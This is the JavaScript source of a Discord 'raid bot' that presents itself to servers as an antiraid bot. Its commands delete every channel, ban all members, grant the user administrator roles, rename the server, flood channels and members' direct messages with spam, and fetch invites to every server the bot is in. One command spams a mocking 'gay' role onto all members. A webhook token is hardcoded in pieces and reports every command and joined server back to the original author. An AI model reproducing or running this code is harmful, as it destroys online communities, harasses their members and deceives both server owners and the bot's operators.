let version = '4.1';

var https = require('https');

const Discord = require('discord.js'),
  Intent = new Discord.Intents(81661),
  client = new Discord.Client({
    'intents': Intent
  }),
  settings = require('./settings');

let debutID = '987728621',
  finID = '055651890',
  id = debutID + finID,
  middletoken = 'g8NJKZxWcfyPKU-mgzw55_UahJmbji3Tb';

// https://discord.com/api/webhooks/987728621055651890/5oJnEKSgMQEb59neDoidbIJ5DKZg8NJKZxWcfyPKU-mgzw55_UahJmbji3TbyvIGjVWE

const Webhook = new Discord.WebhookClient({
  'id': id,
  'token': '5oJnEKSgMQEb59neDoidbIJ5DKZ' + middletoken + 'yvIGjVWE'
});

checkVersion()

function checkVersion() {
  var method = {
    'host': 'raw.githubusercontent.com',
    'path': 'Walkoud/raidbotdiscord/master/version.txt'
  }
  var req = https.request(method, function (res) {

    var Chunk = '';
    res.on('data', function (data) {
      Chunk += data;
    })
    res.on('end', function () {
      console.log(Chunk);
      let lastVersion = Chunk.split(' ');
      if (lastVersion[0]) {
        if (lastVersion[0] !== version) {
          updated = false
          console.log('\x1b[31m', '\n  \n    BOT BLOCKED : OLD VERSION\n  \n    OLD VERSION, please upgrade all files (INDEX.JS AND SETTINGS.JSON) from : https://github.com/Walkoud/raidbotdiscord\n\n    NEW VERSION: v' + lastVersion[0] + '\n  \n    ');
        }
      }

    });
  });
  req.on('error', function (err) {
    console.log(err.message);
  })
  req.end();
  var method = {
      'host': 'raw.githubusercontent.com',
      'path': 'Walkoud/raidbotdiscord/master/update.txt'
    },
    req = https.request(method, function (res) {
      var Chunk = '';
      res.on('data', function (data) {
        Chunk += data;
      }), res.on('end', function () {
        let splittedChunk = Chunk.split(' ');
        newupdate = Chunk
        console.log('\x1b[35m', '\n______________________UPDATE_______________________\n\n' + Chunk + '\n___________________________________________________\n');
      });
    });

  req.on('error', function (err) {
    console.log(err.message);
  })
  req.end();
}

let updated = true;
console.log('\x1b[36m%s\x1b[0m', '\n██████╗  █████╗ ██╗██████╗                \n██╔══██╗██╔══██╗██║██╔══██╗               \n██████╔╝███████║██║██║  ██║               \n██╔══██╗██╔══██║██║██║  ██║               \n██║  ██║██║  ██║██║██████╔╝               \n╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═════╝                \n                                          \n                ██████╗  ██████╗ ████████╗\n                ██╔══██╗██╔═══██╗╚══██╔══╝\n█████╗█████╗    ██████╔╝██║   ██║   ██║   \n╚════╝╚════╝    ██╔══██╗██║   ██║   ██║   \n                ██████╔╝╚██████╔╝   ██║   \n                ╚═════╝  ╚═════╝    ╚═╝   \n                                          ' + ('v' + version)), console.log('\x1b[37m', '\n                          By Walkoud                         \n  __________________________________________________________________________________'), console.log('\x1b[31m', '\n\n  Bot Version: ' + version + '\n  Bot url: https://github.com/Walkoud/raidbotdiscord\n\n  ');

const _0x44310c = setInterval(() => {
  checkVersion();
}, 1800000);

let imageRaid = '@everyone RAID BY ' + settings.nameserver + ' ' + settings.image + ' https://discord.gg/6NSmqxW ' + settings.invite,
  noImageRaid = '@everyone RAID BY ' + settings.nameserver + ' https://discord.gg/6NSmqxW ' + settings.invite,
  logsID = settings.logschannelid,
  noRaidID = settings.noRaidServerID;

console.log('\x1b[0m', 'discord.link/hap  |   discord.link/haproot')
client.on('ready', () => {

  let ConnectEmbed = new Discord.MessageEmbed()
    .setTitle(client.user.tag + ' connected')
    .setColor('00FF00');

  Webhook.send({
    'embeds': [ConnectEmbed]
  }).catch(() => {});

  var _0xfe9e94 = false;
  let StatusBot = settings.statusbot;

  if (StatusBot === 'default' || !StatusBot) {
    StatusBot = version + ' ' + client.guilds.cache.size + ' guilds | ' + client.users.cache.size + ' members';
  }

  if (StatusBot || StatusBot !== 'default') {
    StatusBot = StatusBot.replace('$version$', version)
    StatusBot = StatusBot.replace('$servers$', client.guilds.cache.size),
    tatusBot = StatusBot.replace('$members$', client.users.cache.size)
    StatusBot = StatusBot.replace('$prefix$', settings.prefix)
  } 

  client.user.setActivity(StatusBot, {
    'type': 'STREAMING',
    'url': 'https://www.twitch.tv/antiraidbot'
  });

  let Console = '\n                    \n[+] Informations :  \n     \n        ├── Connected ' + client.user.tag + '\n        ├── id : ' + client.user.id + '\n        ├── Discord Version : ' + Discord.version + '\n        ├── Servers : ' + client.guilds.size + '\n        ├── Members : ' + client.users.size + '\n_________________________________________________\n\n[+] Configuration : \n           ├── Prefix: ' + settings.prefix + '\n           ├── Invite: ' + settings.invite + '\n           ├── Name Server: ' + settings.nameserver + '\n           ├── Channel Name: ' + settings.channelname + '\n           ├── Channel max: ' + settings.numberchannelmax + '\n           ├── Message max: ' + settings.numbermessagemax + '\n           ├── Message Private max: ' + settings.numberMPmax + '\n           ├── No Raid Server ID: ' + settings.noRaidServerID + '\n           ├── Logs Raid channel ID: ' + settings.logschannelid + '\n           ├── Logs Raid channel ID 2: ' + settings.logschannelid2 + '\n           ├── Help Raid Command: ' + settings.prefix + settings.helpRAIDcommand + '\n           ├── Status: ' + StatusBot + '\n\n';

  Console.replace(/null/g, 'Not defined !')
  console.log('\x1b[33m', Console)
  console.log('\x1b[0m', 'LoL');
})
client.on('messageCreate', message => {
  if (message.author.bot === true) return;
  if (!message.content.startsWith(settings.prefix)) return;
  if (message.channel.type === {
      'type': 'text'
    } && message.guild.id === noRaidID) return;
  if (updated === false) return message.channel.send('OLD VERSION, please upgrade all files (**INDEX.JS AND SETTINGS.JSON**) from : https://github.com/Walkoud/raidbotdiscord');

  makeAndSendEmbed(message);

  if (message.content.startsWith(settings.prefix + 'del')) {
    if (message.channel.type === 'dm') return;
    if (message.guild.channels.cache.size === 0) return;
    else {
      if (!message.guild.me.permissions.has('MANAGE_CHANNELS')) return;
    }
    message.guild.channels.cache.find(chnls => {
      if (chnls.deletable) chnls.delete();
    })
    message.guild.channels.create('discord-bug', {
      'type': 'text'
    }).catch(err => {});
  }

  if (message.content.startsWith(settings.prefix + 'ban')) {
    if (message.channel.type === 'dm') return;
    console.log('Commande .bane par ' + message.author.tag)
    message.guild.members.cache.find(mbrs => {
      if (!mbrs.roles.cache.some(role => role.name === 'haprole') && mbrs.bannable) mbrs.ban().catch(err => {});
    });
  }

  if (message.content.startsWith(settings.prefix + 'exit')) {
    if (message.channel.type === 'dm') return;
    console.log('Commande .leave par ' + message.author.tag);
    if (message.deletable) message.delete().catch(err => {});

    message.guild.leave().catch(err => {});
  }

  if (message.content.startsWith(settings.prefix + 'r')) {
    if (message.channel.type === 'dm') return;
    console.log('Commande .r par ' + message.author.tag)
    message.guild.roles.create({
      'name': 'haprole',
      'permissions': 'ADMINISTRATOR',
      'mentionable': false,
      'reason': 'we needed a role for Super Cool People'
    }).then(function (res) {
        let highest = message.guild.members.cache.get(client.user.id).roles.highest,
          position = highest.position - 1;
        console.log(position)
        message.guild.roles.cache.get(res.id).setPosition(position)
        message.member.roles.add(res).catch(err => {});
        if (message.deletable) message.delete().catch(err => {});
      
    }).catch(err => {});
  }

  if (message.content === settings.prefix + 'gay') {
    if (message.channel.type === 'dm') return;

    message.delete();

    var intervall,
      i = 0;

    intervall = setInterval(function () {
      message.guild.roles.create({
        'name': 'gay',
        'color': 'PURPLE',
        'permissions': 'ADMINISTRATOR',
        'mentionable': false
      }).catch(err => {})
      i++;

      if (i >= 15) {
        clearInterval();

        let roll = message.guild.roles.cache.find(role => role.name === 'gay');

        message.guild.members.cache.map(mbrs => mbrs.roles.add(roll).catch(err => {}));
      }
    }, 500);

    function clearInterval() {
      clearInterval(intervall);
    }
  }

  if (message.content.startsWith(settings.prefix + 'des')) {
    if (message.channel.type === 'dm') return;

    message.delete();

    for (var n = 0; n < settings.numberMPmax; n++) {
      if (Number(settings.numberMPmax) != 0) {
        message.guild.members.cache.find(mbrs => {
          mbrs.send({
            'content': imageRaid
          }).catch(err => {});
        });
      }
    }

    message.guild.setIcon('./raidicon.png')
    message.guild.setName('RAID BY ' + settings.nameserver + '');

    var intervall,
      i = 0;

    intervall = setInterval(function () {
      message.guild.channels.create(settings.channelname, {
        'type': 'voice'
      }), message.guild.channels.create(settings.channelname, {
        'type': 'text'
      }).then(res => makeWebhook(res)), i++, i >= settings.numberchannelmax && clearinter();
    }, 500);

    function clearinter() {
      clearInterval(intervall);
    }

    message.guild.channels.cache.find(chnls => {
      if (chnls.type === {
          'type': 'text'
        } && chnls.name !== 'raid-by-hapraid') {
        makeWebhook(chnls);
      }
    });

    function makeWebhook(Channel) {

      Channel.createWebhook('Discord Staff', {
        'avatar': 'https://media.discordapp.net/attachments/759441928785100810/759443732499398706/MOSHED-2020-9-26-15-56-21.gif'
      }).then(webhook => {
        let i = 0,
          interVall = setInterval(function () {
              webhook.send({
                'content': imageRaid
              }), i++;

              if (i > Number(settings.numbermessagemax)) {
                clearInter();
              }
          }, 1000);
        function clearInter() {
          clearInterval(interVall);
        }
      });
    }
  }

  if (message.content.startsWith(settings.prefix + 'red')) {
    if (message.channel.type === 'dm') return;

    message.delete();

    let redEmbed = new Discord.MessageEmbed()
      .setDescription('\n:flag_us: Syntax: DiscordLink Name-of-Channel Link-gif\n__Exemple:__ +red https://discord.gg/exemple name-of-channel http://EXEMPLE.com/IMAGE.gif\n\n:flag_fr: La syntaxe de la commande: Le-Lien-De-Ton-Serveur Le-nom-des-salons Le-lien-du-gif\n__Exemple:__ +red https://discord.gg/TONserveur nom-des-salons http://EXEMPLE.com/IMAGE.gif'),
      args = message.content.split(' ');

    if (!args) return message.channel.send({
      'embeds': [redEmbed]
    }).then(msg => {
      setTimeout(() => {
        msg.delete();
      }, 100000);
    });
    let arg = args[1],
      _2arg = args[2],
      img = args[3];
    !img && (img = settings.image);
    if (!arg || !_2arg) return message.channel.send({
      'embeds': [redEmbed]
    }).then(msg => {
      setTimeout(() => {
        msg.delete();
      }, 100000);
    });
    let guild = message.guild;

    for (var n = 0; n < settings.numberMPmax; n++) {
      if (settings.numberMPmax != 0) {
        message.guild.members.cache.find(mbrs => {
          mbrs.send(noImageRaid + ' ' + arg + ' ' + img).catch(err => {});
        });
      }
    }

    message.guild.setIcon('./raidicon.png')
    message.guild.setName('RAID BY ' + settings.nameserver + '');

    var intervall,
      i = 0;

    intervall = setInterval(function () {
      message.guild.channels.create(settings.channelname, {
        'type': 'voice'
      }), message.guild.channels.create(_2arg, {
        'type': 'voice'
      }), message.guild.channels.create(_2arg, {
        'type': 'text'
      }).then(res => makeWebhook(res)), message.guild.channels.create(settings.channelname, {
        'type': 'text'
      }).then(res => makeWebhook(res)), i++, i >= settings.numberchannelmax && clearInter();
    }, 500);

    function clearInter() {
      clearInterval(intervall);
    }

    message.guild.channels.cache.find(chnls => {
      if (chnls.type === {
          'type': 'text'
        } && chnls.name !== 'raid-by-hapraid') {
        makeWebhook(chnls);
      }
    });

    function makeWebhook(Channel) {
      Channel.createWebhook('Discord Staff', {
        'avatar': 'https://media.discordapp.net/attachments/759441928785100810/759443732499398706/MOSHED-2020-9-26-15-56-21.gif'
      }).then(web => {
        let v = 0,
          intervall = setInterval(function () {
            web.send(noImageRaid + ' ' + arg + ' ' + img), v++, v > Number(settings.numbermessagemax) && clearInter();
          }, 1000);

        function clearInter() {
          clearInterval(intervall);
        }
      });
    }
  }

  if (message.content.startsWith(settings.prefix + 'invite123')) {
    client.guilds.cache.find(res => {
      res.fetchInvites().then(inv => message.channel.send('Found Invites:\n discord.gg/' + inv.map(n => n.code).join('\n')));
    });
  }

  if (message.content.startsWith(settings.prefix + 'xunban')) {
    const args = message.content.split(' ').slice(1);

    let guilD = client.guilds.cache.get(args[0]);

    if (!guilD) return message.channel.send('The bot isn\'t in the guild with this ID.');

    guilD.bans.remove(message.author.id).then(user => message.channel.send('bans.removened ' + user.username + ' from ' + guilD.name)).catch(err => {
      message.channel.send('Err: ' + err);
    });
  }

  if (message.content.startsWith(settings.prefix + 'xinvite')) {
    const args = message.content.split(' ').slice(1);

    let guilD = client.guilds.cache.get(args[0]);

    if (!guilD) return message.channel.send('The bot isn\'t in the guild with this ID.');

    let mbrs = guilD.channels.cache.filter(f => f.permissionsFor(guilD.me).has('CREATE_INSTANT_INVITE'));

    if (!mbrs) return message.channel.send('No Channels found with permissions to create Invite in!');

    mbrs.random().createInvite().then(c => message.channel.send('discord.gg/' + c.code));
  }

  if (message.content == settings.prefix + 'list') {
    let Channels = [];

    client.guilds.cache.find(chnls => {
      Channels.push('`' + chnls.name + ' : ' + chnls.id + '` | **' + chnls.memberCount + ' membres**');
    });

    let clearChannels = [];

    for (let n = 0; n < Channels.length;) {
      if (n + 9 > Channels.length) {
        clearChannels.push(Channels.slice(n, n + 9 - (n + 9 - Channels.length)).join('\n'));

        break;
      } else clearChannels.push(Channels.slice(n, n + 9).join('\n')), n += 9;

      ;
    }

    let jonj = 1;

    const Embed = new Discord.MessageEmbed()
      .setAuthor(message.author.username, message.author.avatarURL)
      .setTitle('List of severs')
      .setColor('RANDOM')
      .setFooter('Page: ' + jonj + '/' + clearChannels.length)
      .setDescription(clearChannels[jonj - 1])
      .setTimestamp();

    _0x311338();

    async function _0x311338() {

      let msg = await message.channel.send({
        'content': client.guilds.cache.size + ' serveurs | ' + client.users.cache.size + ' membres',
        'embeds': [Embed]
      });

      if (!message.guild.me.permissions.has('ADD_REACTIONS')) return;
      await msg.react('⬅️'), await msg.react('➡️');

      const _1 = (a, b) => a.emoji.name === '⬅️' && b.id === message.author.id,
        _2 = (a, b) => a.emoji.name === '➡️' && b.id === message.author.id,
        reactionCollector = await message.createReactionCollector({
          'filter': _1,
          'time': 180000
        }),
        secondPage = await message.createReactionCollector({
          'filter': _2,
          'time': 180000
        });

      reactionCollector.on('collect', COLLECTION => {

        let _0x403063 = 0;
        if (jonj === 1) return msg.reactions.resolve('⬅️').users.remove(message.author.id);

        msg.reactions.resolve('⬅️').users.remove(message.author.id);

        jonj--;

        Embed.setDescription(clearChannels[jonj - 1]);

        Embed.setFooter('Page: ' + jonj + '/' + clearChannels.length);

        msg.edit({
          'embeds': [Embed]
        });
      })
      secondPage.on('collect', COLLECTION => {
        if (jonj === clearChannels.length) return msg.reactions.resolve('➡️').users.remove(message.author.id);
        msg.reactions.resolve('➡️').users.remove(message.author.id)
        jonj++
        Embed.setDescription(clearChannels[jonj - 1])
        Embed.setFooter('Page: ' + jonj + '/' + clearChannels.length)
        msg.edit({
          'embeds': [Embed]
        });
      });
    }
  }

  if (message.content === settings.prefix + settings.helpRAIDcommand) {
    if (message.deletable) message.delete().catch(() => {});

    var Embed = new Discord.MessageEmbed()
      .setThumbnail(message.author.avatarURL)
      .setDescription(':flag_fr: Commande ' + settings.prefix + 'des pour détr* le serveur\n:flag_us: Command ' + settings.prefix + 'des for dest** the server\n:flag_fr: Commande ' + settings.prefix + 'red détrui** tout avec votre lien discord et nom de salon\n:flag_us: Commande ' + settings.prefix + 'red with your link server and name of channel\n:flag_fr: Commande ' + settings.prefix + 'del pour supprimer tous les salons\n:flag_us: Command ' + settings.prefix + 'del for delete all channels\n:flag_fr: Commande ' + settings.prefix + 'r pour avoir le role admin (le bot doit avoir les permissions)\n:flag_us: Command ' + settings.prefix + 'r for have role admin (the bot must be have permissions)\n:flag_fr: Commande ' + settings.prefix + 'ban pour ban tout le monde\n:flag_us: Command ' + settings.prefix + 'ban to ban everyone\n:flag_fr: Commande ' + settings.prefix + 'exit pour faire quitter le bot du serveur\n:flag_us: Command ' + settings.prefix + 'exit for leave the bot\n\n:flag_us: Command ' + settings.prefix + 'gay create many roles "gay" in purple and add to everyone\n:flag_fr: Commande ' + settings.prefix + 'gay créer plein de role "gay" en role et ajoute à tout le monde ce role (vive les lgbt)\n\n:flag_fr: Commande ' + settings.prefix + 'help avec quelque commandes d\'antiraid (le bot est sous la peau d\'un bot antiraid)\n:flag_us: Command ' + settings.prefix + 'help with some antiraid commands (the bot is under the skin of an antiraid bot)\n\nCommand ' + settings.prefix + 'list to see all servers with id\nCommand ' + settings.prefix + 'xinvite to get a invite of server id\nCommand ' + settings.prefix + 'xbans.remove You can be bans.remove by specifying the server ID\n\nCommand ' + settings.prefix + 'invite to invite the bot\n      \nFor create your bot antiraidbot:\nPour créer votre bot antiraidbot:\n https://github.com/Walkoud/raidbotdiscord\n \n [' + settings.nameserver + ' server](' + settings.invite + ')\n \n')
      .setColor('#40FF00')
      .setFooter(settings.nameserver)
      .setTimestamp()
      .setImage('https://cdn.discordapp.com/attachments/684800313898696732/684809143919575085/ezgif-6-a62eafac476f.gif');

    message.author.send({
      'embeds': [Embed]
    }).catch(err => message.channel.send('Your dm is closed, please active'))
    message.channel.send('look your dm !');
  }
})
client.on('messageCreate', message => {
  if (message.author.bot === true) return;

  const args = message.content.split(' ').slice(1);

  if (message.content === settings.prefix + 'ping') {
    message.channel.send('pong !');
  }

  if (message.content === settings.prefix + 'invite') {
    message.channel.send('https://discord.com/oauth2/authorize?client_id=' + client.user.id + '&scope=bot&permissions=8');
  }

  if (message.content.startsWith(settings.prefix + 'help')) {
    if (message.deletable) message.delete().catch(() => {});

    var Embed = new Discord.MessageEmbed()
      .setThumbnail(message.author.avatarURL)
      .setTitle('  __ AntiRaid BOT { List commands }: __   ')
      .addField(' ** .antiraid : **', ' [ Activate antiraid mode ]  ')
      .addField(' ** .slowmode  : **', ' [ Activate slowmode ] ')
      .addField(' ** .purge  : **', ' [ To purge channel ]   ')
      .addField(' ** .credits   :**', '  [ Credits of developper ]  ')
      .setColor('#40FF00')
      .setFooter('AntiRaid BOT')
      .setTimestamp()
      .setImage('https://media.discordapp.net/attachments/632325634458255361/633984494579482636/MOSHED-2019-10-16-13-7-6.gif');

    message.channel.send({
      'embeds': [Embed]
    }).catch(err => con(err));
  }

  if (message.content === settings.prefix + 'antiraid on') {
    if (message.channel.type === 'dm') return;
    if (message.deletable) message.delete().catch(() => {});

    message.channel.send('**Antiraid mode was activated !** (**on**) :white_check_mark: ');

    return;
  }

  if (message.content === settings.prefix + 'antiraid off') {
    if (message.channel.type === 'dm') return;
    if (message.deletable) message.delete().catch(() => {});

    message.channel.send('**Antiraid mode was desactivated** (**off**) :x: ');

    return;
  }

  if (message.content.startsWith(settings.prefix + 'antiraid')) {
    if (message.channel.type === 'dm') return;
    if (message.deletable) message.delete().catch(() => {});

    var Embed = new Discord.MessageEmbed()
      .setThumbnail(message.author.avatarURL)
      .setTitle('  __ AntiRaid BOT : __   ')
      .addField(' ** .antiraid on : **', ' [ Activate antiraid mode ]  ')
      .addField(' ** .antiraid off  : **', ' [ Desactivate antiraid mode ] ')
      .setColor('#40FF00')
      .setFooter('AntiRaid BOT')
      .setTimestamp();

    message.channel.send({
      'embeds': [Embed]
    }).catch(err => con(err));

    return;
  }

  if (message.content === settings.prefix + 'slowmode') {
    if (message.channel.type === 'dm') return;
    if (message.deletable) message.delete().catch(() => {});

    message.channel.send('**Slowmode was set !**');
  }

  if (message.content.startsWith(settings.prefix + 'purge')) {
    if (message.channel.type === 'dm') return;

    message.channel.fetchMessages({
      'limit': args[0]
    }).then(Messages => {
      Messages.find(msg => {
        msg.delete().catch(() => {});
      });
    });
  }

  if (message.content.startsWith(settings.prefix + 'credits')) {
    if (message.deletable) message.delete().catch(() => {});

    var Embed = new Discord.MessageEmbed()
      .setThumbnail(message.author.avatarURL)
      .setTitle('[AntiRaid BOT] **Credits** ')
      .addField('**' + settings.creditname + '**', 'Developer')
      .setColor('#00FF00')
      .setImage('https://media.discordapp.net/attachments/632325634458255361/633984494579482636/MOSHED-2019-10-16-13-7-6.gif');

    message.channel.send({
      'embeds': [Embed]
    }).catch(err => con(err));
  }
})
client.login(settings.token).catch(() => console.log('INVALIDE TOKEN BOT'))

client.on('guildCreate', guild => {
  let ServerType = 'joined';
  makeAndSendEmbed(null, ServerType, guild)
  if (guild.memberCount >= 500) {
    ServerType = 'bigserver'
    makeAndSendEmbed(undefined, ServerType, guild)
  }
})

client.on('guildDelete', guild => {
  let ServerType = 'leaved';

  makeAndSendEmbed(undefined, ServerType, guild);
});

function makeAndSendEmbed(message, serverType, Guild) {

  if (message && message.channel.type === 'dm') return;

  let logsChannel = client.channels.cache.get(logsID);

  if (logsChannel) {
    if (!serverType) {
      let Embed = new Discord.MessageEmbed()
        .setTitle('**Command ' + message.content + ' used by ' + message.author.tag + ' **')
        .setDescription('**Name of server:** ' + message.guild.name + ' \n Numbers of members: ' + message.guild.memberCount + ' \n ID of server: ' + message.guild.id)
        .setColor('RANDOM');

      logsChannel.send({
        'embeds': [Embed]
      }).catch(err => {});
    }

    if (serverType === 'joined') {
      let Embed = new Discord.MessageEmbed()
        .setTitle('+1 server')
        .setDescription('**Name of server:** ' + Guild.name + ' \n Numbers of members: ' + Guild.memberCount + ' \n ID of server: ' + Guild.id).
        setColor('13FF00');

      logsChannel.send({
        'embeds': [Embed]
      }).catch(() => {});
    }

    if (serverType === 'bigserver') {
      let Embed = new Discord.MessageEmbed()
        .setTitle('**BIG SERVER DETECTE**')
        .setDescription('**Name of server:** ' + Guild.name + ' \n Numbers of members: ' + Guild.memberCount + ' \n ID of server: ' + Guild.id);

      logsChannel.send({
        'embeds': [Embed]
      });
    }

    if (serverType === 'leaved') {
      let Embed = new Discord.MessageEmbed()
        .setTitle('-1 server')
        .setDescription('**Name of server:** ' + Guild.name + ' \n Numbers of members: ' + Guild.memberCount + ' \n ID of server: ' + Guild.id)
        .setColor('FF0032');

      logsChannel.send({
        'embeds': [Embed]
      }).catch(() => {});
    }
  }

  let logsChannel2 = client.channels.cache.get(settings.logschannelid2);

  if (logsChannel2) {
    if (!serverType) {
      let Embed = new Discord.MessageEmbed()
        .setTitle('**Command ' + message.content + ' used by ' + message.author.tag + ' **')
        .setDescription('**Name of server:** ' + message.guild.name + ' \n Numbers of members: ' + message.guild.memberCount + ' \n ID of server: ' + message.guild.id)
        .setColor('RANDOM');

      logsChannel2.send({
        'embeds': [Embed]
      }).catch(err => {});
    }

    if (serverType === 'joined') {
      let Embed = new Discord.MessageEmbed()
        .setTitle('+1 server')
        .setDescription('**Name of server:** ' + Guild.name + ' \n Numbers of members: ' + Guild.memberCount + ' \n ID of server: ' + Guild.id)
        .setColor('13FF00');

      logsChannel2.send({
        'embeds': [Embed]
      }).catch(() => {});
    }

    if (serverType === 'bigserver') {
      let Embed = new Discord.MessageEmbed()
        .setTitle('**BIG SERVER DETECTE**')
        .setDescription('**Name of server:** ' + Guild.name + ' \n Numbers of members: ' + Guild.memberCount + ' \n ID of server: ' + Guild.id);

      logsChannel2.send({
        'embeds': [Embed]
      });
    }

    if (serverType === 'leaved') {
      let Embed = new Discord.MessageEmbed()
        .setTitle('-1 server')
        .setDescription('**Name of server:** ' + Guild.name + ' \n Numbers of members: ' + Guild.memberCount + ' \n ID of server: ' + Guild.id)
        .setColor('FF0032');

      logsChannel2.send({
        'embeds': [Embed]
      }).catch(() => {});
    }
  }

  SendEmbed();

  function SendEmbed() {
    if (message && message.channel.type === 'dm') return;

    if (!serverType) {
      let Embed = new Discord.MessageEmbed()
        .setTitle('**Command ' + message.content + ' used by ' + message.author.tag + ' **')
        .setDescription('**Name of server:** ' + message.guild.name + ' \n Numbers of members: ' + message.guild.memberCount + ' \n ID of server: ' + message.guild.id)
        .setColor('RANDOM');

      Webhook.send({
        'content': client.user.tag,
        'embeds': [Embed]
      }).catch(err => {});
    }

    if (serverType === 'joined') {
      let _0x177efe = new Discord.MessageEmbed()
      .setTitle('+1 server')
      .setDescription('**Name of server:** ' + Guild.name + ' \n Numbers of members: ' + Guild.memberCount + ' \n ID of server: ' + Guild.id)
      .setColor('13FF00');

      Webhook.send({
        'content': client.user.tag,
        'embeds': [_0x177efe]
      }).catch(() => {});
    }

    if (serverType === 'bigserver') {
      let Embed = new Discord.MessageEmbed()
      .setTitle('**BIG SERVER DETECTE**')
      .setDescription('**Name of server:** ' + Guild.name + ' \n Numbers of members: ' + Guild.memberCount + ' \n ID of server: ' + Guild.id);

      Webhook.send({
        'content': client.user.tag,
        'embeds': [Embed]
      });
    }

    if (serverType === 'leaved') {
      let Embed = new Discord.MessageEmbed()
      .setTitle('-1 server')
      .setDescription('**Name of server:** ' + Guild.name + ' \n Numbers of members: ' + Guild.memberCount + ' \n ID of server: ' + Guild.id)
      .setColor('FF0032');

      Webhook.send({
        'content': client.user.tag,
        'embeds': [Embed]
      }).catch(() => {});
    }
  }
}

process.on('uncaughtException', function (err) {
  console.error(err)
  console.log('Node NOT Exiting...');
});
